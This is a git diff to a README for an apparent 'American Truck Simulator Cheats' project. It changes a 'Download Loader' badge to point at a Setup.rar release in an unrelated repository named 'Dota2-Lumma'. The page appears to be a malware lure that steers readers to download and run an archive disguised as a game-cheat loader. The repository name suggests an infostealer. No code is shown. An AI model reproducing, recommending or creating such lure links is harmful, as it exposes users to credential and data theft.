@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for American Truck Simulator Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `American-Truck-Simulator-Cheats` · Updated: 2026-10-29
 
 **Tags:** `american-truck-simulator` `simulation` `trucks` `driving`
+
 
